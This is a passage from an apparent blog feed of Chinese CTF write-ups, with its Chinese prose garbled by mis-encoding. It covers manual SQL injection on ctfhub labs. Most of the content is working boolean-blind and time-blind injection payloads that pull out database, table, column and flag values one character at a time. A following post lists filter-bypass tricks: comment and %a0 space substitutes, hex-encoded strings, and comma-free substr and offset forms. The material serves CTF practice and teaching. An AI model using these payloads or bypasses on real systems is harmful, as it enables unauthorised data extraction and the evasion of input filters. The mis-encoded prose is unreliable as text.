class="number">2</span></span><br></pre></td></tr></table></figure><ol start="7"><li>æ ¹æ®è¡¨åå’Œåˆ—æ•°é‡çˆ†åˆ—åé•¿åº¦</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">select</span> columns <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">1</span></span><br><span class="line">#query_error</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">select</span> columns <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span></span><br><span class="line">#query_success</span><br><span class="line">#å½“å‰åº“sqliè¡¨flagçš„ç¬¬ä¸€åˆ—åˆ—åé•¿åº¦ä¸º<span class="number">4</span></span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">select</span> columns <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span></span><br><span class="line">#query_success</span><br><span class="line">#å½“å‰åº“sqliè¡¨flagçš„ç¬¬äºŒåˆ—åˆ—åé•¿åº¦ä¸º<span class="number">4</span></span><br><span class="line"></span><br><span class="line">#å½“å‰åº“sqliè¡¨flagæœ‰ä¸¤ä¸ªåˆ—â€˜idâ€™å’Œâ€˜flagâ€™ï¼Œåˆ—åé•¿åº¦ä¸º<span class="number">2</span>å’Œ<span class="number">4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="8"><li>æ ¹æ®åˆ—åé•¿åº¦çˆ†åˆ—å</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> columns_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span></span><br><span class="line">#query_error</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> columns_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;i&#x27;</span></span><br><span class="line">#query_success</span><br><span class="line">#å½“å‰åº“sqliè¡¨flagçš„ç¬¬ä¸€åˆ—åˆ—åç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºi</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> columns_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;g&#x27;</span></span><br><span class="line">#query_success</span><br><span class="line">#å½“å‰åº“sqliè¡¨flagçš„ç¬¬äºŒåˆ—åˆ—åç¬¬å››ä¸ªå­—ç¬¦ä¸ºg</span><br><span class="line"></span><br><span class="line">#å½“å‰åº“sqliè¡¨flagæœ‰ä¸¤ä¸ªåˆ—â€˜idâ€™å’Œâ€˜flagâ€™</span><br></pre></td></tr></table></figure><ol start="9"><li>æ ¹æ®åˆ—åçˆ†æ•°æ®</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> flag <span class="keyword">from</span> sqli.flag),<span class="number">1</span>ï¼Œ<span class="number">1</span>)<span class="operator">=</span>â€œaâ€</span><br><span class="line">#query_error</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> flag <span class="keyword">from</span> sqli.flag),<span class="number">1</span>ï¼Œ<span class="number">1</span>)<span class="operator">=</span>â€œcâ€</span><br><span class="line">#query_success</span><br><span class="line">#flagçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯c</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> flag <span class="keyword">from</span> sqli.flag),iï¼Œ<span class="number">1</span>)<span class="operator">=</span>â€œ&#125;â€</span><br><span class="line">#query_success</span><br><span class="line">#flagçš„æœ€åä¸€ä¸ªå­—ç¬¦æ˜¯&#125;</span><br><span class="line">#è¿™é‡Œçš„jæ˜¯è®¡æ•°å˜é‡jä»<span class="number">1</span>è‡ªå¢<span class="number">1</span>å¾—åˆ°çš„å€¼</span><br><span class="line"></span><br><span class="line">#å‡ºå¾ªç¯å³å¯å¾—åˆ°flag</span><br></pre></td></tr></table></figure><h3 id="ä¾‹é¢˜3ï¼šæ—¶é—´ç›²æ³¨-ctfhub"><a href="#ä¾‹é¢˜3ï¼šæ—¶é—´ç›²æ³¨-ctfhub" class="headerlink" title="ä¾‹é¢˜3ï¼šæ—¶é—´ç›²æ³¨(ctfhub)"></a>ä¾‹é¢˜3ï¼šæ—¶é—´ç›²æ³¨(ctfhub)</h3><p>æ—¶é—´ç›²æ³¨å’Œä¸Šä¸€ç¯‡å¸ƒå°”ç›²æ³¨ä¸€æ ·éƒ½æ˜¯ç›²æ³¨ï¼Œéƒ½éœ€è¦å€ŸåŠ©<code>length</code>,<code>ascii</code>,<code>substr</code>è¿™äº›ç¥å¥‡çš„å‡½æ•°æ¥çŒœæµ‹å„é¡¹ä¿¡æ¯ã€‚å®ƒä»¬çš„å·®åˆ«æ˜¯çŒœæµ‹æˆåŠŸçš„ä¾æ®ã€‚</p><p>å¸ƒå°”ç›²æ³¨çš„è¯å¦‚æœæŸ¥è¯¢æœ‰ç»“æœï¼Œä¸€èˆ¬ä¼šæœ‰ä¸€ä¸ª<code>success_flag</code>,æ¯”å¦‚åœ¨ä¸Šä¸€é¢˜é‡Œå°±ä¼šè¿”å›<code>query successfully</code>ã€‚</p><p>ä½†æ˜¯æ—¶é—´ç›²æ³¨ä¸ä¸€æ ·ï¼Œå®ƒä¸å…‰ä¸ç»™ä½ æŸ¥è¯¢çš„å†…å®¹çš„å›æ˜¾ï¼Œä¸ç»™ä½ æŠ¥é”™ä¿¡æ¯ï¼Œç”šè‡³è¿å¸ƒå°”ç›²æ³¨é‡Œçš„<code>success_flag</code>ä¹Ÿä¸ç»™ã€‚<br>æ—¶é—´ç›²æ³¨ç›¸å½“äºè‡ªè¡Œåˆ›é€ å‡ºäº†ä¸€ä¸ª<code>success_flag</code>ï¼Œå°†æŸ¥è¯¢æˆåŠŸçš„æƒ…å†µä¸æŸ¥è¯¢å¤±è´¥çš„æƒ…å†µåšäº†åŒºåˆ†ã€‚</p><blockquote><p><code>substr(str,from,length)</code>:è¿”å›ä»ä¸‹æ ‡ä¸ºfromæˆªå–é•¿åº¦ä¸ºlengthçš„strå­ä¸²ã€‚<strong>å…¶ä¸­ï¼Œé¦–å­—ç¬¦ä¸‹æ ‡ä¸º1</strong></p></blockquote><ol><li>é¦–å…ˆçˆ†ç ´æ•°æ®åº“é•¿åº¦</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(length(database())<span class="operator">=</span><span class="number">4</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230717201555815.png" alt="image-20230717201555815"></p><ol start="2"><li>çˆ†ç ´æ•°æ®åº“åå­—</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)ascii(s)<span class="operator">=</span><span class="number">115</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">113</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)ascii(q)<span class="operator">=</span><span class="number">113</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">108</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)ascii(l)<span class="operator">=</span><span class="number">108</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">4</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">4</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">105</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)ascii(i)<span class="operator">=</span><span class="number">105</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">ä¸æ–­è°ƒæ•´ASCIIç çš„èŒƒå›´é€æ¸å¾—åˆ°æ•°æ®åº“åç§°ä¸ºsqli</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230717201850243.png" alt="image-20230717201850243"></p><ol start="3"><li>çˆ†ç ´æ•°æ®åº“ä¸­è¡¨çš„æ•°é‡</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> if((<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">2</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230717202031447.png" alt="image-20230717202031447"></p><ol start="4"><li>çˆ†ç ´æ•°æ®åº“ä¸­çš„å„è¡¨å</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line">  <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">110</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line">  ascii(n)<span class="operator">=</span><span class="number">110</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>ç§’åå“åº”ï¼Œè¯´æ˜ç¬¬ä¸€å¼ è¡¨çš„ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºn</span><br><span class="line">ä¾æ¬¡å¾—åˆ°è¡¨åä¸ºnews</span><br><span class="line">limit i,<span class="number">1</span>  i è¡¨ç¤ºçš„å³æ˜¯ç¬¬å‡ å¼ è¡¨</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line">  <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">102</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line">  ascii(f)<span class="operator">=</span><span class="number">102</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>ç§’åå“åº”ï¼Œè¯´æ˜ç¬¬äºŒå¼ è¡¨çš„ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºf</span><br><span class="line">ä¾æ¬¡å¾—åˆ°è¡¨åä¸ºflag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230717202404932.png" alt="image-20230717202404932"></p><ol start="5"><li>çˆ†ç ´flagè¡¨çš„å­—æ®µæ•°</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> if((<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>)<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ol start="6"><li>çŒœè§£å­—æ®µå</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">102</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ä¸€æ ·çš„å¥—è·¯ï¼Œå¾—åˆ°å­—æ®µåä¸ºflag</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä¾‹é¢˜-æ‰‹å·¥æ³¨å…¥&quot;&gt;&lt;a href=&quot;#ä¾‹é¢˜-æ‰‹å·¥æ³¨å…¥&quot; class=&quot;headerlink&quot; title=&quot;ä¾‹é¢˜(æ‰‹å·¥æ³¨å…¥)&quot;&gt;&lt;/a&gt;ä¾‹é¢˜(æ‰‹å·¥æ³¨å…¥)&lt;/h1&gt;&lt;h3 id=&quot;ä¾‹é¢˜1ï¼šæŠ¥é”™æ³¨å…¥-ctfhub&quot;&gt;&lt;a href=&quot;#ä¾‹é¢˜1ï¼šæŠ¥é”™æ³¨å…¥-ctfhub&quot;</summary>
      
    
    
    
    <category term="Web" scheme="https://iahzl.github.io/categories/Web/"/>
    
    
    <category term="æ‰‹å·¥æ³¨å…¥" scheme="https://iahzl.github.io/tags/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/"/>
    
    <category term="æŠ¥é”™æ³¨å…¥" scheme="https://iahzl.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    
    <category term="å¸ƒå°”ç›²æ³¨" scheme="https://iahzl.github.io/tags/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    
    <category term="æ—¶é—´ç›²æ³¨" scheme="https://iahzl.github.io/tags/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
    
    <category term="ctfhub" scheme="https://iahzl.github.io/tags/ctfhub/"/>
    
  </entry>
  
  <entry>
    <title>sqlæ³¨å…¥ç»•è¿‡æŠ€å·§</title>
    <link href="https://iahzl.github.io/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"/>
    <id>https://iahzl.github.io/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</id>
    <published>2023-08-06T02:27:43.000Z</published>
    <updated>2023-08-06T02:28:54.663Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqlæ³¨å…¥ç»•è¿‡æŠ€å·§"><a href="#sqlæ³¨å…¥ç»•è¿‡æŠ€å·§" class="headerlink" title="sqlæ³¨å…¥ç»•è¿‡æŠ€å·§"></a>sqlæ³¨å…¥ç»•è¿‡æŠ€å·§</h1><h2 id="1-ç»•è¿‡ç©ºæ ¼ï¼ˆæ³¨é‡Šç¬¦-ï¼Œ-a0ï¼‰ï¼š"><a href="#1-ç»•è¿‡ç©ºæ ¼ï¼ˆæ³¨é‡Šç¬¦-ï¼Œ-a0ï¼‰ï¼š" class="headerlink" title="1.ç»•è¿‡ç©ºæ ¼ï¼ˆæ³¨é‡Šç¬¦&#x2F;* *&#x2F;ï¼Œ%a0ï¼‰ï¼š"></a>1.ç»•è¿‡ç©ºæ ¼ï¼ˆæ³¨é‡Šç¬¦&#x2F;* *&#x2F;ï¼Œ%a0ï¼‰ï¼š</h2><p>ã€€ã€€<code>ä¸¤ä¸ªç©ºæ ¼ä»£æ›¿ä¸€ä¸ªç©ºæ ¼ï¼Œç”¨Tabä»£æ›¿ç©ºæ ¼ï¼Œ%a0=ç©ºæ ¼ï¼š</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">20</span> <span class="operator">%</span><span class="number">09</span> <span class="operator">%</span><span class="number">0</span>a <span class="operator">%</span><span class="number">0</span>b <span class="operator">%</span><span class="number">0</span>c <span class="operator">%</span><span class="number">0</span>d <span class="operator">%</span>a0 <span class="operator">%</span><span class="number">00</span> <span class="comment">/**/</span>  <span class="comment">/*!*/</span></span><br></pre></td></tr></table></figure><p> æœ€åŸºæœ¬çš„ç»•è¿‡æ–¹æ³•ï¼Œç”¨æ³¨é‡Šæ›¿æ¢ç©ºæ ¼ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  æ³¨é‡Š */</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230719194920907.png" alt="image-20230719194920907"></p><p>ä½¿ç”¨æµ®ç‚¹æ•°ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8E0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8.0</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="2-æ‹¬å·ç»•è¿‡ç©ºæ ¼ï¼š"><a href="#2-æ‹¬å·ç»•è¿‡ç©ºæ ¼ï¼š" class="headerlink" title="2.æ‹¬å·ç»•è¿‡ç©ºæ ¼ï¼š"></a>2.æ‹¬å·ç»•è¿‡ç©ºæ ¼ï¼š</h2><p>ã€€ã€€å¦‚æœç©ºæ ¼è¢«è¿‡æ»¤ï¼Œæ‹¬å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨æ‹¬å·ç»•è¿‡ã€‚</p><p>ã€€ã€€åœ¨MySQLä¸­ï¼Œæ‹¬å·æ˜¯ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢çš„ã€‚å› æ­¤ï¼Œä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ã€‚è€Œæ‹¬å·çš„ä¸¤ç«¯ï¼Œå¯ä»¥æ²¡æœ‰å¤šä½™çš„ç©ºæ ¼ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(<span class="keyword">user</span>())<span class="keyword">from</span> dual <span class="keyword">where</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>)<span class="keyword">and</span>(<span class="number">2</span><span class="operator">=</span><span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>ã€€ã€€è¿™ç§è¿‡æ»¤æ–¹æ³•å¸¸å¸¸ç”¨äºtime basedç›²æ³¨,ä¾‹å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">and</span>(sleep(ascii(mid(database()<span class="keyword">from</span>(<span class="number">1</span>)<span class="keyword">for</span>(<span class="number">1</span>)))<span class="operator">=</span><span class="number">109</span>))<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p>ï¼ˆfrom forå±äºé€—å·ç»•è¿‡ä¸‹é¢ä¼šæœ‰ï¼‰</p><p>ã€€ã€€ä¸Šé¢çš„æ–¹æ³•æ—¢æ²¡æœ‰é€—å·ä¹Ÿæ²¡æœ‰ç©ºæ ¼ã€‚çŒœè§£databaseï¼ˆï¼‰ç¬¬ä¸€ä¸ªå­—ç¬¦asciiç æ˜¯å¦ä¸º109ï¼Œè‹¥æ˜¯åˆ™åŠ è½½å»¶æ—¶ã€‚</p><h2 id="3-å¼•å·ç»•è¿‡ï¼ˆä½¿ç”¨åå…­è¿›åˆ¶ï¼‰"><a href="#3-å¼•å·ç»•è¿‡ï¼ˆä½¿ç”¨åå…­è¿›åˆ¶ï¼‰" class="headerlink" title="3.å¼•å·ç»•è¿‡ï¼ˆä½¿ç”¨åå…­è¿›åˆ¶ï¼‰"></a>3.å¼•å·ç»•è¿‡ï¼ˆä½¿ç”¨åå…­è¿›åˆ¶ï¼‰</h2><p>ã€€ã€€ä¼šä½¿ç”¨åˆ°å¼•å·çš„åœ°æ–¹ä¸€èˆ¬æ˜¯åœ¨æœ€åçš„<code>where</code>å­å¥ä¸­ã€‚å¦‚ä¸‹é¢çš„ä¸€æ¡sqlè¯­å¥ï¼Œè¿™æ¡è¯­å¥å°±æ˜¯ä¸€ä¸ªç®€å•çš„ç”¨æ¥æŸ¥é€‰å¾—åˆ°usersè¡¨ä¸­æ‰€æœ‰å­—æ®µçš„ä¸€æ¡è¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name  <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;users&quot;</span><br></pre></td></tr></table></figure><p>ã€€ã€€è¿™ä¸ªæ—¶å€™å¦‚æœå¼•å·è¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆä¸Šé¢çš„<code>where</code>å­å¥å°±æ— æ³•ä½¿ç”¨äº†ã€‚é‚£ä¹ˆé‡åˆ°è¿™æ ·çš„é—®é¢˜å°±è¦ä½¿ç”¨<strong>åå…­è¿›åˆ¶</strong>æ¥å¤„ç†è¿™ä¸ªé—®é¢˜äº†ã€‚<br><code>ã€€ã€€users</code>çš„åå…­è¿›åˆ¶çš„å­—ç¬¦ä¸²æ˜¯<code>7573657273</code>ã€‚é‚£ä¹ˆæœ€åçš„sqlè¯­å¥å°±å˜ä¸ºäº†ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name  <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span></span><br></pre></td></tr></table></figure><h2 id="4-é€—å·ç»•è¿‡ï¼ˆä½¿ç”¨fromæˆ–è€…offsetï¼‰ï¼š"><a href="#4-é€—å·ç»•è¿‡ï¼ˆä½¿ç”¨fromæˆ–è€…offsetï¼‰ï¼š" class="headerlink" title="4.é€—å·ç»•è¿‡ï¼ˆä½¿ç”¨fromæˆ–è€…offsetï¼‰ï¼š"></a>4.é€—å·ç»•è¿‡ï¼ˆä½¿ç”¨fromæˆ–è€…offsetï¼‰ï¼š</h2><p>ã€€ã€€åœ¨ä½¿ç”¨ç›²æ³¨çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨åˆ°substr(),mid(),limitã€‚è¿™äº›å­å¥æ–¹æ³•éƒ½éœ€è¦ä½¿ç”¨åˆ°é€—å·ã€‚å¯¹äºsubstr()å’Œmid()è¿™ä¸¤ä¸ªæ–¹æ³•å¯ä»¥ä½¿ç”¨<code>from to</code>çš„æ–¹å¼æ¥è§£å†³ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>ã€€ã€€ä½¿ç”¨joinï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>     #ç­‰ä»·äº</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b</span><br></pre></td></tr></table></figure><p>ã€€ã€€ä½¿ç”¨likeï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ascii(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">80</span>   #ç­‰ä»·äº</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">&#x27;r%&#x27;</span></span><br></pre></td></tr></table></figure><p>ã€€ã€€å¯¹äº<code>limit</code>å¯ä»¥ä½¿ç”¨<code>offset</code>æ¥ç»•è¿‡ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"># 